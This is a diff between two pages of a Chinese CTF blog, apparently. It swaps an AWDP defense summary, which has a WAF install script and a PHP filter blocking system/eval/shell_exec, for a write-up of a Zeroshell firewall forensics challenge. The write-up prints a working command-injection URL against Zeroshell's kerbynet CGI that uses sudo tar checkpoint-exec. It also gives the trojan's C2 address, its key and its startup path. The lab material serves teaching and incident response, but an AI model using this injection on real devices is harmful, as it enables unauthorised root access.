@@ -15,7 +15,7 @@
 
 
 
-<title>awdp总结 | 鱿鱼</title>
+<title>2024长城杯&amp;CISCN-威胁流量分析-zeroshell | 鱿鱼</title>
 
 
 
@@ -192,7 +192,7 @@
         </h2>
       </a>
       <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
-        awdp总结
+        2024长城杯&CISCN-威胁流量分析-zeroshell
       </div>
       <div class="flex-1"></div>
       <div class="flex items-center gap-3">
@@ -256,23 +256,23 @@
   <header class="overflow-hidden pt-6 pb-6 md:pt-12">
     <div class="pt-4 md:pt-6">
       <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
-        awdp总结
+        2024长城杯&CISCN-威胁流量分析-zeroshell
       </h1>
       <div>
         <section class="flex items-center gap-3 text-sm">
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
-            <time>2024-12-12</time>
+            <time>2024-12-17</time>
           </span>
           <span class="text-gray-400">·</span>
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
-            <span>1 min</span>
+            <span>4 min</span>
           </span>
           <span class="text-gray-400">·</span>
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
-            <span>333 words</span>
+            <span>1.1k words</span>
           </span>
           
         </section>
@@ -281,21 +281,71 @@
   </header>
   <!-- content -->
   <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
-    <p>关于awdp 这一块的<br>并且赛制是 每一轮你fix或者break的题都会加分 </p>
-<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><h4 id="php的fix-可以上通防"><a href="#php的fix-可以上通防" class="headerlink" title="php的fix 可以上通防"></a>php的fix 可以上通防</h4><h4 id="https-github-com-leohearts-awd-watchbird-releases"><a href="#https-github-com-leohearts-awd-watchbird-releases" class="headerlink" title="https://github.com/leohearts/awd-watchbird/releases"></a><a target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird/releases">https://github.com/leohearts/awd-watchbird/releases</a></h4><h4 id="将so和php文件下载好"><a href="#将so和php文件下载好" class="headerlink" title="将so和php文件下载好"></a>将so和php文件下载好</h4><h4 id="同时编写好update-sh-内容就是开启通防命令"><a href="#同时编写好update-sh-内容就是开启通防命令" class="headerlink" title="同时编写好update.sh 内容就是开启通防命令"></a>同时编写好update.sh 内容就是开启通防命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> watchbird.php /var/www/html/</span><br><span class="line"><span class="built_in">mv</span> waf.so /var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 /var/www/html/wa*</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/www/html;php warchbird.php --install /var/www/html/</span><br></pre></td></tr></table></figure>
+    <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</span><br></pre></td></tr></table></figure>
 
-<p>对update.sh进行 chmod +x update.sh 使得我们上传的update.sh能够被执行 也就是让我们的fix生效<br>最后一般是让你打包 上传<br>打包指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcvf update.tar.gz watchbird.php waf.so update.sh</span><br></pre></td></tr></table></figure>
+<h3 id="1-从数据包中找出攻击者利用漏洞开展攻击的会话-攻击者执行了一条命令-，写出该会话中设置的flag-结果提交形式-flag-x"><a href="#1-从数据包中找出攻击者利用漏洞开展攻击的会话-攻击者执行了一条命令-，写出该会话中设置的flag-结果提交形式-flag-x" class="headerlink" title="1.从数据包中找出攻击者利用漏洞开展攻击的会话(攻击者执行了一条命令)，写出该会话中设置的flag,结果提交形式:flag{x}"></a>1.从数据包中找出攻击者利用漏洞开展攻击的会话(攻击者执行了一条命令)，写出该会话中设置的flag,结果提交形式:flag{x}</h3><p>题目给了攻击流量包，攻击者是执行了一条命令，我们设置过滤http，对数据包追踪</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/1.png"></p>
+<p>看到exec后面执行ps，后面回显了所有进程,这里就是攻击者的payload,在数据包的Referer有一串编码是base64</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9</span><br><span class="line">flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p>解压指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf update.tar.gz</span><br></pre></td></tr></table></figure>
 
-<p>然后将update.tar.gz上传即可<br>这种能够防住大部分的php 有些会导致check不过 也就是我们所说的防御过度<br>我们可以手动上waf<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15535">https://xz.aliyun.com/t/15535</a></p>
-<h3 id="小皮干货："><a href="#小皮干货：" class="headerlink" title="小皮干货："></a>小皮干货：</h3><p>1.文件上传漏洞 可以直接过滤. 这样就能防住了<br>2.框架性题目 如果直接上通防导致服务异常 可以去入口文件加waf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$str1 =&quot;&quot;;</span><br><span class="line">foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">    $str1.=$key;</span><br><span class="line">    $str1.=$value;</span><br><span class="line">&#125;</span><br><span class="line">$str2 =&quot;&quot;;</span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    $str2.=$key;</span><br><span class="line">    $str2.=$value;</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&quot;/:\/\/|\&#x27;|\&quot;|&lt;\?|system|file_get|file_put|shell_exec|eval/i&quot;, $str1)||preg_match(&quot;/:\/\/|\&#x27;|\&quot;|&lt;\?|system|file_get|file_put|shell_exec|eval/i&quot;, $str2)) &#123;</span><br><span class="line">    die(&#x27;Hacker!&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-通过漏洞利用获取设备控制权限，然后査找设备上的flag文件，提取flag文件内容，结果提交形式-flag-xxxxxxxxxx"><a href="#2-通过漏洞利用获取设备控制权限，然后査找设备上的flag文件，提取flag文件内容，结果提交形式-flag-xxxxxxxxxx" class="headerlink" title="2.通过漏洞利用获取设备控制权限，然后査找设备上的flag文件，提取flag文件内容，结果提交形式:flag{xxxxxxxxxx}"></a>2.通过漏洞利用获取设备控制权限，然后査找设备上的flag文件，提取flag文件内容，结果提交形式:flag{xxxxxxxxxx}</h3><p>在第一步的时候，我们已经找到了攻击payload，配置好网络，打开虚拟机，访问 <a target="_blank" rel="noopener" href="http://61.139.2.100/">http://61.139.2.100/</a> 用payload rce</p>
+<p>在Database目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;ls /&#x27;%0A&#x27;</span><br></pre></td></tr></table></figure>
 
-<h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>白盒ctf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;cat /Database/flag&#x27;%0A&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式-flag-xxx-，如flag-www-abc-com-或-flag-16-122-33-44"><a href="#3-找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式-flag-xxx-，如flag-www-abc-com-或-flag-16-122-33-44" class="headerlink" title="3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式:flag{xxx}，如flag{www.abc.com} 或 flag(16.122.33.44)"></a>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式:flag{xxx}，如flag{<a target="_blank" rel="noopener" href="http://www.abc.com}/">www.abc.com}</a> 或 flag(16.122.33.44)</h3><p>可以用netstat 命令显示网络状态</p>
+<h4 id><a href="#" class="headerlink" title></a><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/3.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br><span class="line">-antp选项的意思是列出所有（a）当前的网络连接，不限制网络协议（n），并显示监听状态的（t）TCP连接以及相关进程信息（p）。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/4.png"></p>
+<p>这个bash就是执行的木马文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;202.115.89.103&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4.请写出木马进程执行的本体文件的名称，结果提交形式:flag{xxxxx}，仅写文件名不加路径</p>
+<p>在linux每个运行中的进程在&#x2F;proc下都有一个对应的目录，名称为进程ID。这些目录包含了多个文件和子目录，记录了进程的状态、资源使用等信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmdline的文件，该文件包含了启动该进程时所使用的命令行参数</span><br><span class="line">cwd：一个符号链接，指向进程的当前工作目录。</span><br><span class="line">exe：一个符号链接，指向启动进程的可执行文件的绝对路径。</span><br><span class="line">environ：包含了进程的环境变量。</span><br><span class="line">fd：一个目录，包含了进程打开的所有文件的符号链接。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/10651/</span><br><span class="line">-l (查看详细信息）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/5.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;.nginx&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式-flag-xxxx"><a href="#5-请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式-flag-xxxx" class="headerlink" title="5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式:flag{xxxx}"></a>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式:flag{xxxx}</h3><p>我们已经找到了木马文件.nginx,直接cat就是文件的ascii,不好提取，我们可以用到xxd命令只显示16进制把他16进制提取出来，去010导入16进制</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/6.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd  -p /tmp/.nginx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/7.png"></p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/8.png"></p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/9.png"><br>shift f12可疑发现字符串 逆向分析到函数用到了这个字符串</p>
+<p>就是这个函数用到了</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/10.png"></p>
+<p>再进去sub_8049C93</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/11.png"></p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/12.png"></p>
+<p>函数执行了复杂的字符串和整数处理，包括XOR加密&#x2F;解密操作所以确定他就是加密密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11223344qweasdzxc&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式-flag-xxxx-，如flag-a-b-c"><a href="#6-请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式-flag-xxxx-，如flag-a-b-c" class="headerlink" title="6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式:flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}"></a>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式:flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}</h3><p>我们可以看看环境变量</p>
+<p>当前工作目录</p>
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/register/system/startup/scripts/nat/File</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/14.png">确实执行了恶意程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/var/register/system/startup/scripts/nat/File&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 
   </article>
   <!-- tag -->
@@ -306,16 +356,11 @@
   <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
     <div>
       
-        <a href="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
-          2024长城杯&CISCN-威胁流量分析-zeroshell
-        </a>
-      
     </div>
     <div>
       
-        <a href="/2024/12/12/%E5%9B%BD%E5%9F%8E%E6%9D%AFWP/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          国城杯WP
+        <a href="/2024/12/12/awdp%E6%80%BB%E7%BB%93/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          awdp总结
           <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
         </a>
       
